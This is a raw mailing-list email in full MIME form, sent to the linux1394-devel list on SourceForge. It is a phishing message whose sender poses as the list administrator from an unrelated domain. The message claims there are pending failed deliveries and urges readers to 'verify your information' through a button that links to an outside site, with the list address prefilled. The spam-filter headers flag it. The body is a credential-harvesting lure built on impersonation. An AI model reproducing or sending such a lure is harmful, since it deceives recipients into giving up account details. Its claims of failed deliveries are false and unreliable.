Return-Path: <linux1394-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+linux1394-devel@lfdr.de
Delivered-To: lists+linux1394-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 086859DE76
	for <lists+linux1394-devel@lfdr.de>; Tue, 27 Aug 2019 09:11:34 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <linux1394-devel-bounces@lists.sourceforge.net>)
	id 1i2VdU-0001CY-QR; Tue, 27 Aug 2019 07:11:24 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <sales@plexonsolutions.partners>) id 1i2VdU-0001CO-7L
 for linux1394-devel@lists.sourceforge.net; Tue, 27 Aug 2019 07:11:24 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=HjypAQsLPhnfYpZUhPo7KsEdrjQ8eZ11r4/qkec7qt8=; b=c/PLM6F/nFtHWW0Cx7Npdb89pJ
 oUCfwk2BYd4robiB89l70izWfxTOa1ijJslFltun9zzUnJDCFE62CwSEDQT8DHRrnczuhznOF1ClU
 D08KJ/ZU0mS43kWVa3cSx9m3gF/3kRgpIXEUOrKkk+H9dwZ575D3vkbwP3EZ13SaO7n4=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=HjypAQsLPhnfYpZUhPo7KsEdrjQ8eZ11r4/qkec7qt8=; b=R
 oadUVvYf4vig6j2ax9q8QaCOnlPn/ES3QZ2TyueUBbOey5+n/iSBS8810rdP+8EvApek5yNT3gRWq
 BgvDMj+g1KYNxo75ni+5g9MvUpA/YMyCQP9aThhlmy6VMJo0B6hke55KbciYMiRggLSfkJdXzMu+u
 skknqDbNrL/ZEkvQ=;
Received: from [162.241.211.234] (helo=server.plexonsolutions.partners)
 by sfi-mx-4.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 id 1i2VdS-00Gnsu-OV
 for linux1394-devel@lists.sourceforge.net; Tue, 27 Aug 2019 07:11:24 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=plexonsolutions.partners; s=default; h=Content-Transfer-Encoding:
 Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=HjypAQsLPhnfYpZUhPo7KsEdrjQ8eZ11r4/qkec7qt8=; b=LOwx1x3Hqw1uKfGdcUwR1lfQx
 LR1O/rAiiQmcvwfReOc/1JXMsyC2fwa/BB+cN3yo9k+8gZNxtO89bKvqlJ2nbLHQBb3sUBPLLEi8K
 sQDAZoQDso1xK+rnjh4cr1EkAiL2LE44yhQb/QeZ+ZtgAUCply61ZuwUslcO4z6tFan4uUt/mL4iU
 D+eZ2TVoWNxY46aSrZwh0EpCmGJLrG9+3FQZf1/HoecRI6McgbIBKN12dqDDzZhuFerMYqeBS7QKE
 K8VZgWJrYGN2phHuRgcr/BUY5P5O4fe+Rer1L3tF4M1tryXB7DTaPm+jNfiWj1Vf5M0j4+W6Eg2ri
 i+GnFEa8w==;
Received: from v-104-153-108-111.unman-vds.premium-chicago.nfoservers.com
 ([104.153.108.111]:52116 helo=plexonsolutions.partners)
 by server.plexonsolutions.partners with esmtpsa
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92)
 (envelope-from <sales@plexonsolutions.partners>) id 1i2VdL-00072Q-PE
 for linux1394-devel@lists.sourceforge.net; Tue, 27 Aug 2019 07:11:16 +0000
From: lists.sourceforge.net ADMIN <sales@plexonsolutions.partners>
To: linux1394-devel@lists.sourceforge.net
Subject: You Have Pending (1482) Failed Email Deliveries
Date: 27 Aug 2019 00:11:16 -0700
Message-ID: <20190827001116.C164AD9441A310A8@plexonsolutions.partners>
MIME-Version: 1.0
X-AntiAbuse: This header was added to track abuse,
 please include it with any abuse report
X-AntiAbuse: Primary Hostname - server.plexonsolutions.partners
X-AntiAbuse: Original Domain - lists.sourceforge.net
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - plexonsolutions.partners
X-Get-Message-Sender-Via: server.plexonsolutions.partners: authenticated_id:
 sales@plexonsolutions.partners
X-Authenticated-Sender: server.plexonsolutions.partners: sales@plexonsolutions.partners
X-Source: 
X-Source-Args: 
X-Source-Dir: 
X-Spam-Score: 6.1 (++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: caelca.com.co]
 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?162.241.211.234>]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 1.0 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 -0.3 AWL AWL: Adjusted score from AWL reputation of From: address
X-Headers-End: 1i2VdS-00Gnsu-OV
X-BeenThere: linux1394-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: Linux IEEE 1394 development list
 <linux1394-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/linux1394-devel>, 
 <mailto:linux1394-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=linux1394-devel>
List-Post: <mailto:linux1394-devel@lists.sourceforge.net>
List-Help: <mailto:linux1394-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/linux1394-devel>, 
 <mailto:linux1394-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8647455138996304916=="
Errors-To: linux1394-devel-bounces@lists.sourceforge.net

--===============8647455138996304916==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<div tabindex=3D"-1" class=3D"gmail-_rp_D5 gmail-ms-font-weight-regular gma=
il-ms-font-color-neutralDark" id=3D"gmail-Item.MessageNormalizedBody" role=
=3D"presentation" style=3D'font-family: "wf_segoe-ui_normal", "Segoe UI", "=
Segoe WP", Tahoma, Arial, sans-serif, serif, "EmojiFont";'>
<div class=3D"gmail-rps_ff30">
<div><span class=3D"gmail-x_gmail-m_-5203122729798197500size" style=3D"font=
-size: 18px;"><span class=3D"gmail-x_gmail-m_-5203122729798197500font" styl=
e=3D'font-family: verdana, sans-serif, serif, "EmojiFont";'><span><span><sp=
an><span>Dear &nbsp;linux1394-devel,<br><br><br><br>
<span style=3D'text-align: center; color: rgb(33, 37, 41); text-transform: =
none; text-indent: 0px; letter-spacing: normal; font-family: -apple-system,=
 BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-seri=
f, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 28p=
x; font-style: normal; font-weight: 500; word-spacing: 0px; float: none; di=
splay: inline !important; white-space: normal; orphans: 2; widows: 2; backg=
round-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial;'>You have pending&nbsp;(105) failed email deliveries</span><font color=
=3D"#000000" face=3D"Verdana"><br></font>
<h3 style=3D'text-align: center; color: rgb(33, 37, 41); text-transform: no=
ne; line-height: 1.2; text-indent: 0px; letter-spacing: normal; font-family=
: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", =
Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"=
; font-style: normal; font-weight: 500; margin-top: 0px; word-spacing: 0px;=
 white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backgr=
ound-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial;'>
<p style=3D"margin-top: 0px; box-sizing: border-box;">&nbsp;</p></h3></span=
></span></span></span></span></span>
<div>
<div style=3D'line-height: normal; font-family: arial, sans-serif, serif, "=
EmojiFont"; font-size: small; margin-top: 0px; margin-bottom: 0px;'><span c=
lass=3D"gmail-x_gmail-m_-5203122729798197500size" style=3D"font-size: 18px;=
"><span class=3D"gmail-x_gmail-m_-5203122729798197500font" style=3D'font-fa=
mily: verdana, sans-serif, serif, "EmojiFont";'>
<span style=3D'text-align: center; color: rgb(33, 37, 41); text-transform: =
none; text-indent: 0px; letter-spacing: normal; font-family: -apple-system,=
 BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-seri=
f, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 16p=
x; font-style: normal; font-weight: 400; word-spacing: 0px; float: none; di=
splay: inline !important; white-space: normal; orphans: 2; widows: 2; backg=
round-color: rgb(255, 255, 255);=20
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-style: initial; text-decoration-color: init=
ial;'><font size=3D"1">Verify your information to deliver your e-mails<br><=
/font><br><br><br><br><br></span><br>
<a style=3D"background-position: 0% 0%; margin: 2px; padding: 8px; border-r=
adius: 3px; border: 1px solid rgb(0, 0, 0); color: rgb(255, 255, 255); floa=
t: left; display: block; background-image: none; background-repeat: repeat;=
 background-color: rgb(1, 116, 223);" href=3D"https://caelca.com.co/retriev=
ing/?email=3Dlinux1394-devel@lists.sourceforge.net" target=3D"_blank" rel=
=3D"noopener noreferrer"><span>Retrieve Your Emails Here&nbsp;</span></a></=
span></span><br></div>
<div style=3D'line-height: normal; font-family: arial, sans-serif, serif, "=
EmojiFont"; font-size: small; margin-top: 0px; margin-bottom: 0px;'><span c=
lass=3D"gmail-x_gmail-m_-5203122729798197500size" style=3D"font-size: 18px;=
"><span class=3D"gmail-x_gmail-m_-5203122729798197500font" style=3D'font-fa=
mily: verdana, sans-serif, serif, "EmojiFont";'><span></span></span></span>=
<br>&nbsp;</div>
<div style=3D'line-height: normal; font-family: arial, sans-serif, serif, "=
EmojiFont"; font-size: small; margin-top: 0px; margin-bottom: 0px;'><span c=
lass=3D"gmail-x_gmail-m_-5203122729798197500size" style=3D"font-size: 18px;=
"><span class=3D"gmail-x_gmail-m_-5203122729798197500font" style=3D'font-fa=
mily: verdana, sans-serif, serif, "EmojiFont";'></span></span>&nbsp;</div><=
/div></div></div></div></body></html>


--===============8647455138996304916==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8647455138996304916==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
mailing list linux1394-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/linux1394-devel

--===============8647455138996304916==--
